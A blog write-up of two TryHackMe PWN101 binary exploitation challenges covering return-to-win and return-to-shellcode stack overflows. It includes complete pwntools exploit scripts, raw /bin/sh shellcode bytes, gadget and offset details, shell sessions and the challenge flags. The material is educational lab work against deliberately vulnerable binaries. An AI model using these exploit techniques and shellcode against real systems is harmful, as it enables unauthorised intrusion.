---
title: 'TryHackMe PWN101 Write-Up (Part 2)'
date: 2026-06-24T07:53:00+07:00
tags: ["ctf", "pwn"]
---

Previously, we did two challenges dealing with basic buffer overflows on the stack. After doing the next two challenges, I found that they still use the same overflow concept, but instead of using it just to overwrite variables, we will now use it to control the program's execution flow.

## Challenge 3: Return to Win

First, let's do some recon on our binary using `file` and `checksec`.

```
$ file pwn103-1644300337872.pwn103
pwn103-1644300337872.pwn103: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=3df2200610f5e40aa42eadb73597910054cf4c9f, for GNU/Linux 3.2.0, not stripped
$ pwn checksec pwn103-1644300337872.pwn103
[*] '/home/nia/pwn101/chall03/pwn103-1644300337872.pwn103'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

This is a 64-bit Linux binary, and it's `not stripped`, which means that we can see all the function names that is written by the programmer before the program is compiled. This is helpful because knowing function names can help us make some sort of sense of what they do.

> Note: The fact that the binary has `No PIE` and `No canary found` is also relevant for this specific challenge, but more on that later.

We can list all the function names on gdb like so:

```
pwndbg> info func
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401030  strncmp@plt
0x0000000000401040  puts@plt
0x0000000000401050  system@plt
0x0000000000401060  printf@plt
0x0000000000401070  read@plt
0x0000000000401080  strcmp@plt
0x0000000000401090  setvbuf@plt
0x00000000004010a0  __isoc99_scanf@plt
0x00000000004010b0  _start
0x00000000004010e0  _dl_relocate_static_pie
0x00000000004010f0  deregister_tm_clones
0x0000000000401120  register_tm_clones
0x0000000000401160  __do_global_dtors_aux
0x0000000000401190  frame_dummy
0x0000000000401196  setup
0x00000000004011f7  rules
0x0000000000401262  announcements
0x00000000004012be  general
0x0000000000401378  bot_cmd
0x00000000004014e2  discussion
0x000000000040153e  banner
0x0000000000401554  admins_only
0x000000000040158c  main
0x0000000000401680  __libc_csu_init
0x00000000004016e0  __libc_csu_fini
0x00000000004016e4  _fini
```

Even though there's quite a lot, only few stood out, like `main`, `admins_only`, `general`, `announcements`, etc. Based on the human names we can guess that these are the functions that are actually written by the programmer, so we can focus on these functions.

### Analyzing the code

After decompiling it on Ghidra, I found that `main` is just a wrapper to other functions that displays a selection menu.

```c

void main(void)
{
  undefined4 local_c;

  setup();
  banner();
  puts(&DAT_00403298);
  puts(&DAT_004032c0);
  puts(&DAT_00403298);
  printf(&DAT_00403323);
  scanf("%d",&local_c);
  switch(local_c) {
  default:
    main();
    break;
  case 1:
    announcements();
    break;
  case 2:
    rules();
    break;
  case 3:
    general();
    break;
  case 4:
    discussion();
    break;
  case 5:
    bot_cmd();
  }
  return;
}
```

Out of all of them, I found the `general` and `admins_only` to be the only interesting ones.

``` c
void general(void)

{
  int iVar1;
  char buf[32];

  puts(&DAT_004023aa);
  puts(&DAT_004023c0);
  puts(&DAT_004023e8);
  puts(&DAT_00402418);
  printf("------[pwner]: ");
  scanf("%s", &buf);
  iVar1 = strcmp(buf,"yes");
  if (iVar1 == 0) {
    puts(&DAT_00402463);
    main();
  }
  else {
    puts(&DAT_0040247f);
  }
  return;
}
```

As seen above in the `general` function, the program declares a buffer with the size of 32 bytes, then fills it with user input by

```c
scanf("%s", &buf);
```

which, similar to what we've encountered previously in Challenge 2, is vulnerable to buffer overflow.

Now let's take a look at `admins_only`:

```c
void admins_only(void)
{
  puts(&DAT_00403267);
  puts(&DAT_0040327c);
  system("/bin/sh");
  return;
}
```

It turns out that `admins_only` invokes a shell, which no other function in the whole program does. Since our goal is to get a shell and read the flag, we want the program to execute this function. The problem is, `admins_only` is called nowhere in the program, not even in `main`, so how can we do it?

### The call stack & redirecting execution flow

Remember that buffer overflows can lead to overwriting other variables near the buffer? Here, we're doing the exact same thing, but it's not just some random variable that we want to overwrite. Rather, it's a very specific thing, which is the RIP [register](https://ctf101.org/binary-exploitation/what-are-registers/), or generally the [instruction pointer](https://robocatz.com/instruction-pointer.htm).

Programmers often call other functions inside a function (like how we call printf inside main). When a function calls another function, what actually happens at a lower-level is the caller function will push the callee's [return address](https://thecodest.co/en/dictionary/return-address/) on the [Stack](https://en.wikipedia.org/wiki/Call_stack), and then make a stack frame for the callee function. A stack frame is where all variables local to a function is stored. Normally, when this callee function has done its job, it will return to its return address without any problem.

But what happens if we find a way to overwrite its return address before it returns? The answer is, it would mess up the flow of our program, because our function will try to return to where it's not supposed to.

Okay, but what does the RIP register has anything to do with return addresses?

Any function that is about to end will execute the `ret` instruction. Based on my understanding, what `ret` basically does is "pop any value that is now sitting on top of the stack into RIP". It means any value that is on top of the stack just before `ret` is executed must be the return address. Therefore, if we were to overflow a local variable in the stack all the way until we overwrite the value on the top of our stack just before `ret` is executed, RIP will be overwritten by that value. There are two possibilites: RIP is overwritten by some gibbersih value, OR an actual, valid memory address that can be found in the program. If it happens to be a valid address, RIP will cause the program to redirect its execution flow there. Otherwise, it will crash.[^1]

To make overwriting the return address harder, modern binaries use canary, which is basically a random value put right before the return address and checks if that value has changed before executing `ret`. However, our binary has `No canary` (as shown in the chekcsec output), so nothing prevents us from overwriting the return address.

### Finding our target address & the offset

Because we want to redirect the flow to `admins_only`, we have to find its adress. Recall that our binary has `No PIE`. That means every function address is static and will never change on each run, so it's easier for us to know the address of any function we want.

We can print a function address like so:

```
pwndbg> p admins_only
$1 = {<text variable, no debug info>} 0x401554 <admins_only>
```

So `admins_only` is at `0x401554`. Because this is a 64-bit binary, any memory address here will be 64 bits (8 bytes) in size.

Therefore, our payload should look more or less like this.

```
??? bytes of some random input
+ 8 bytes of admins_only's address (0x401554)
```

Next, because we want to overwrite RIP with the exact address of `admins_only`, we need to find how many bytes of input before this address such that when the `ret` instruction is executed, `ret` will overwrite RIP with the exact `admins_only`'s address, `0x401554`.

I find gdb-pwndbg's `cyclic` tool to be helpful for this. We can print a sequence of 100 numbers of uniquely-repeating characters by doing `cyclic 100`, and use that as a test input to overflow `buf` in our `general` function.

```
pwndbg> cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```
```
⌨️  Choose the channel: 3

🗣  General:

------[jopraveen]: Hello pwners 👋
------[jopraveen]: Hope you're doing well 😄
------[jopraveen]: You found the vuln, right? 🤔

------[pwner]: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```
And this is what gdb showed right after entering the input:

```
Program received signal SIGSEGV, Segmentation fault.
0x0000000000401377 in general ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────[ LAST SIGNAL ]────────────────────────────────────────────────
Program received signal SIGSEGV (fault address: 0x0).

```
It segfaults, why?

As we see, the top of the stack (what is pointed to by RSP) is now filled with the letters `kaaalaaa...`, which is a part of our input earlier. 

```
──────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffde88 ◂— 'kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
01:0008│     0x7fffffffde90 ◂— 'maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
02:0010│     0x7fffffffde98 ◂— 'oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
```

```
 RSP  0x7fffffffde88 ◂— 'kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
 RIP  0x401377 (general+185) ◂— ret
─────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────
 ► 0x401377 <general+185>    ret                                <0x6161616c6161616b>
    ↓
```

By the time `ret` is executed, this value will be popped into RIP. So, RIP will contain the 8-byte address `kaaalaaa` (which is `0x6161616c6161616b` in hex). This, of course, is not a valid address of a function/instruction, so the program didn't know where it's supposed to go next and just crashed instead.

Instead of overwriting RIP with `0x6161616c6161616b`, we want to overwrite it with `0x0000000000401554` a.k.a. `admins_only`'s address. That means we have to know the exact position the pattern `kaaa...` starts. To do this we can use `cyclic -l`. The reason why this works is because cyclic uses [De Bruijn sequence](https://en.wikipedia.org/wiki/De_Bruijn_sequence) which means every 4 character sequence will be unique throughout the string.

```
pwndbg> cyclic -l kaaa
Finding cyclic pattern of 4 bytes: b'kaaa' (hex: 0x6b616161)
Found at offset 40
```

Now that we found that the offset is 40 bytes, we have a better image on how our payload should look like:

```
40 bytes of some random input
+ 8 bytes of admins_only's address (0x401554)
```

There's still a minor problem, though. In x86-64 pwn challenges there's something called a [stack alignment issue](https://ir0nstone.gitbook.io/notes/binexp/stack/return-oriented-programming/stack-alignment). To solve it, we can use a simple `ret` ROP gadget just before our target address to align the stack. Without this gadget, I didn't manage to get a shell when trying to run the exploit remotely. We can use Ropper tool to find it.

```
$ ropper --file ./pwn103-1644300337872.pwn103 --search ret
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: ret

[INFO] File: ./pwn103-1644300337872.pwn103
0x0000000000401072: ret 0x3f;
0x0000000000401016: ret;
```

Thankfully, we found a `ret` gadget ready to use at `0x401016`, so here's our final payload structure:

```
40 bytes of some random input
+ 8 bytes of a ret gadget's address (0x401016)
+ 8 bytes of admins_only's address (0x401554)
```

### The exploit

```python
#!/usr/bin/env python3

from pwn import *

BINARY = './pwn103-1644300337872.pwn103'
HOST = '10.48.154.125'
PORT = 9003

io = connect(HOST, PORT)
# io = process(BINARY)

admins_only = p64(0x401554)
ret = p64(0x401016)

payload = b'a'*40
payload += ret
payload += admins_only

io.recvuntil(b'Choose the channel: ')
io.sendline(b'3')

io.recvuntil(b'------[pwner]: ')
io.sendline(payload)

io.interactive()
```
```
(ctf_env) nia@io:~/pwn101/chall03$ python3 exploit.py
[*] '/home/nia/pwn101/chall03/pwn103-1644300337872.pwn103'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
[+] Opening connection to 10.48.154.125 on port 9003: Done
[*] Switching to interactive mode
Try harder!!! 💪

👮  Admins only:

Welcome admin 😄
$ ls
flag.txt
pwn103
pwn103.c
$ cat flag.txt
THM{w3lC0m3_4Dm1N}
$
```

We solved the challenge! 

Flag: `THM{w3lC0m3_4Dm1N}`

## Challenge 4: Return to Shellcode
Let's connect to the chall instance.

```
$ nc 10.48.154.125 9004
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 104

I think I have some super powers 💪
especially executable powers 😎💥

Can we go for a fight? 😏💪
I'm waiting for you at 0x7ffc2ade0980
```

Before asking us for an input, they kindly gave us a hex memory address, but what for? Let's find it out:

```c
void main(void)

{
  undefined1 buf[80];

  setup();
  banner();
  puts(&DAT_00402120);
  puts(&DAT_00402148);
  puts(&DAT_00402170);
  printf("I\'m waiting for you at %p\n",buf);
  read(0,buf,200);
  return;
}
```

This line                                                                           
```c
printf("I\'m waiting for you at %p\n",buf);
```
clearly shows that the address being printed earlier was the address of `buf`.
                                                                                                                     We see another problem in the above code. `buf` is declared as an 80 byte buffer, and later the program tries to read 200 bytes of input into `buf`, which can cause an overflow.

### Executable stack
Let's do checks as always:

```
$ file pwn104-1644300377109.pwn104
pwn104-1644300377109.pwn104: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=60e0bab59b4e5412a1527ae562f5b8e58928a7cb, for GNU/Linux 3.2.0, not stripped
$ pwn checksec pwn104-1644300377109.pwn104
[*] '/home/nia/pwn101/chall04/pwn104-1644300377109.pwn104'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```

Now we see something new, which is `NX unknown` and `Stack: Executable`.

When NX is enabled, the Stack is not executable.`NX unknown` means the opposite. So, any code that we put on Stack can be executed as long as the instruction pointer is pointing to the memory address of that code.

Since we are given the address of `buf`, we can inject some malicious code into `buf`, and then overwrite RIP with `buf`'s address. When that happens, RIP will redirect the program to execute our code. This kind of code is called a [shellcode](https://en.wikipedia.org/wiki/Shellcode).

### Crafting a shellcode

We want to get a shell, so let's make a shellcode that opens up a shell (`/bin/sh`). Thankfully, Pwntools made it easy to generate one using `shellcraft.sh()` which can be directly used in the exploit script, but for the sake of learning let's see how a shellcode actually looks like.

Shellcode is written in machine code and thus could be different depending on the machine's architecture. Our binary is x86-64, which is amd64, so let's set the context to amd64 before generating the code, like so:

```python
>>> from pwn import *
>>> context.arch = 'amd64'
>>> shellcraft.sh()
"    /* execve(path='/bin///sh', argv=['sh'], envp=0) */\n    /* push b'/bin///sh\\x00' */\n    push 0x68\n    mov rax, 0x732f2f2f6e69622f\n    push rax\n    mov rdi, rsp\n    /* push argument array ['sh\\x00'] */\n    /* push b'sh\\x00' */\n    push 0x1010101 ^ 0x6873\n    xor dword ptr [rsp], 0x1010101\n    xor esi, esi /* 0 */\n    push rsi /* null terminate */\n    push 8\n    pop rsi\n    add rsi, rsp\n    push rsi /* 'sh\\x00' */\n    mov rsi, rsp\n    xor edx, edx /* 0 */\n    /* call execve() */\n    push SYS_execve /* 0x3b */\n    pop rax\n    syscall\n"
```

As we see, `shellcraft.sh()` generates a full assembly code than opens a shell. However when it comes to sending it in a payload we have to send it as machine code which is in raw bytes. To assemble it into machine code we can use `asm()`.

```python
>>> asm(shellcraft.sh())
b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'
>>> shellcode = asm(shellcraft.sh())
>>> print(len(shellcode))
48
```
Alright, so this is how our shellcode look like in raw bytes, which is 48-bytes long:

```
b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'
```

But to make it actually get executed, there's one more thing to do: overwrite RIP with our shellcode address. Since the start of our shellcode = the start of our input (`buf`), we can simply take this address from what the server gives us earlier.

This is a rough outline of our payload:
```
48 bytes of shellcode
+ ??? bytes of random input until reaching RIP
+ 8 bytes of shellcode's address
```
Now all we need to do is find the offset between the start of `buf` until it reaches RIP.

```
pwndbg> cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
pwndbg> run
Starting program: /home/nia/pwn101/chall04/pwn104-1644300377109.pwn104
Downloading separate debug info for system-supplied DSO at 0x7ffff7fc3000
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 104

I think I have some super powers 💪
especially executable powers 😎💥

Can we go for a fight? 😏💪
I'm waiting for you at 0x7fffffffde50
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```

```
 RSP  0x7fffffffdea8 ◂— 0x6161617861616177 ('waaaxaaa')
 RIP  0x40124e (main+129) ◂— ret
─────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────
 ► 0x40124e <main+129>    ret                                <0x6161617861616177>
    ↓
```
Just like before, it segfaults. The value about to be popped to RIP is which is `waaaxaaa` or `0x6161617861616177`.

```
pwndbg> cyclic -l waaa
Finding cyclic pattern of 4 bytes: b'waaa' (hex: 0x77616161)
Found at offset 88
```

We see that the offset is 88. But remember that our shellcode already takes up 48 bytes of it, so the remaining offset we need to reach RIP is only 88 - 48 = 40 bytes.

```
48 bytes of shellcode
+ 40 bytes of random input until reaching RIP
+ 8 bytes of shellcode's address
```
Notice that when we add them up, our payload is 48 + 40 + 8 = 96 bytes long, which is still safe to be read by `read` since it accepts up to 200 bytes of input.

### The exploit
```python
#!/usr/bin/env python3

from pwn import *

BINARY = './pwn104-1644300377109.pwn104'
HOST = '10.48.154.125'
PORT = 9004

exe = context.binary = ELF(BINARY)

io = connect(HOST, PORT)
# io = process(BINARY)

shellcode = b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'

io.recvuntil(b"I'm waiting for you at 0x")
return_address = int(io.recvline().strip(), 16)

log.success(f'Target Return Address (in hex): {hex(return_address)}')

offset = 88
payload = shellcode
offset -= len(payload)
padding = b'A'*offset
payload += padding
payload += p64(return_address)

# just for logs
log.info("Payload layout:")
log.info(f"     Shellcode           : {shellcode} ({len(shellcode)} bytes)")
log.info(f"     Padding             : {padding} ({len(padding)} bytes)")
log.info(f"     Return address      : {p64(return_address)} ({len(p64(return_address))} bytes)")
log.info(f"TOTAL PAYLOAD LENGTH     : {len(payload)} bytes")
log.info(f"MAX ALLOWED LENGTH       : 200 bytes")
log.info("Checking payload length ...")
if len(payload) <= 200:
    log.success(f"{len(payload)} <= 200 --> Payload length is ok!")
else:
    log.failure(f"{len(payload)} > 200 --> Payload length exceeds maximum length!")

io.sendline(payload)

# check if shell has been successfully launched
io.sendline(b'id')
response = io.recvrepeat(1)
if b'uid=' in response:
    log.success("Got a shell!")

io.interactive()
```

And there we go, a shell!

```
(ctf_env) nia@io:~/pwn101/chall04$ python3 exploit.py
[*] '/home/nia/pwn101/chall04/pwn104-1644300377109.pwn104'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
[+] Opening connection to 10.48.154.125 on port 9004: Done
[+] Target Return Address (in hex): 0x7ffca18025f0
[*] Payload layout:
[*]      Shellcode           : b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05' (48 bytes)
[*]      Padding             : b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' (40 bytes)
[*]      Return address      : b'\xf0%\x80\xa1\xfc\x7f\x00\x00' (8 bytes)
[*] TOTAL PAYLOAD LENGTH     : 96 bytes
[*] MAX ALLOWED LENGTH       : 200 bytes
[*] Checking payload length ...
[+] 96 <= 200 --> Payload length is ok!
[+] Got a shell!
[*] Switching to interactive mode
$ ls
flag.txt
pwn104
pwn104.c
$ cat flag.txt
THM{0h_n0o0o0o_h0w_Y0u_Won??}
$
```

Flag: `THM{0h_n0o0o0o_h0w_Y0u_Won??}`

[^1]: It took me days for the concept of return-address overwrite to finally click. That said, I’m a beginner and there’s still a lot to learn. I think the best way to understand it is by learning from diverse resources, but if there’s one resource I would recommend, it’d be this article: [stack overflows](https://zhuanlan.zhihu.com/p/25816426) 
